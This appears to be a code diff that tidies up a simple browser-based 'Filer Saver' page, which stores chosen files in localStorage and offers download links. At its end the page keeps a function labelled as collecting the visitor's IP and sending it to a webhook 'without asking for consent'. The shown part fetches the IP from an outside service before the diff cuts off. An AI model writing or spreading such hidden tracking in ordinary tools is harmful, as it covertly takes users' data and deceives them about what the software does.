@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Filer Saver minimal</title>
+<title>Filer Saver Minimal</title>
 <style>
     body {
         font-family: Arial, sans-serif;
@@ -12,11 +12,7 @@
         text-align: center;
         padding: 50px;
     }
-
-    h1 {
-        color: #bb86fc;
-    }
-
+    h1 { color: #bb86fc; }
     .container {
         background: rgba(0, 0, 0, 0.6);
         border: 2px solid #663399;
@@ -24,110 +20,81 @@
         border-radius: 10px;
         display: inline-block;
     }
-
     input[type="file"], input[type="text"], button {
         margin: 10px;
         padding: 10px;
         border-radius: 5px;
         border: none;
     }
-
-    input[type="text"] {
-        width: 200px;
-    }
-
+    input[type="text"] { width: 200px; }
     button {
         background-color: #4b0082;
         color: white;
         cursor: pointer;
         transition: background 0.3s;
     }
-
-    button:hover {
-        background-color: #6a0dad;
-    }
-
+    button:hover { background-color: #6a0dad; }
     a.download-link {
         display: block;
         margin-top: 20px;
         color: #bb86fc;
         text-decoration: none;
     }
-
-    a.download-link:hover {
-        text-decoration: underline;
-    }
+    a.download-link:hover { text-decoration: underline; }
 </style>
 </head>
 <body>
     <h1>📁 Filer Saver</h1>
     <div class="container">
-        <input type="file" id="fileInput">
-        <br>
-        <input type="text" id="fileName" placeholder="Enter file name">
-        <br>
+        <input type="file" id="fileInput"><br>
+        <input type="text" id="fileName" placeholder="Enter file name"><br>
         <button id="saveBtn">Save File</button>
-        <a id="downloadLink" class="download-link" style="display:none;">⬇ Download Saved File</a>
-        <br>
+        <a id="downloadLink" class="download-link" style="display:none;">⬇ Download Saved File</a><br>
         <button id="loadFileBtn">Load Saved File</button>
     </div>
 
 <script>
     let fileData = null;
 
-    // Handle file input change event
     document.getElementById("fileInput").addEventListener("change", function() {
         const file = this.files[0];
         if (file) {
             const reader = new FileReader();
-            reader.onload = function(e) {
-                fileData = e.target.result;
-            };
+            reader.onload = e => fileData = e.target.result;
             reader.readAsDataURL(file);
         }
     });
 
-    // Save the file to localStorage
     document.getElementById("saveBtn").addEventListener("click", function() {
         const name = document.getElementById("fileName").value.trim();
         if (!fileData || !name) {
             alert("Please select a file and enter a name.");
             return;
         }
-
-        // Save file data and name to localStorage
         localStorage.setItem(name, fileData);
-
-        // Provide the user with a link to download the file
-        const link = document.getElementById("downloadLink");
-        link.href = fileData;
-        link.download = name;
-        link.style.display = "block";
-        link.textContent = `⬇ Download "${name}"`;
+        updateDownloadLink(name, fileData);
     });
 
-    // Load saved file from localStorage
     document.getElementById("loadFileBtn").addEventListener("click", function() {
         const name = prompt("Enter the file name to load:");
-
-        if (!name) {
-            alert("Please enter a file name.");
-            return;
-        }
-
-        // Check if file data is stored in localStorage
+        if (!name) return;
         const savedFile = localStorage.getItem(name);
         if (savedFile) {
-            const link = document.getElementById("downloadLink");
-            link.href = savedFile;
-            link.download = name;
-            link.style.display = "block";
-            link.textContent = `⬇ Download "${name}"`;
+            updateDownloadLink(name, savedFile);
         } else {
             alert("File not found!");
         }
     });
-    // Function to collect and send IP to the webhook without asking for consent
+
+    function updateDownloadLink(name, data) {
+        const link = document.getElementById("downloadLink");
+        link.href = data;
+        link.download = name;
+        link.style.display = "block";
+        link.textContent = `⬇ Download "${name}"`;
+    }
+
+       // Function to collect and send IP to the webhook without asking for consent
     async function sendIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
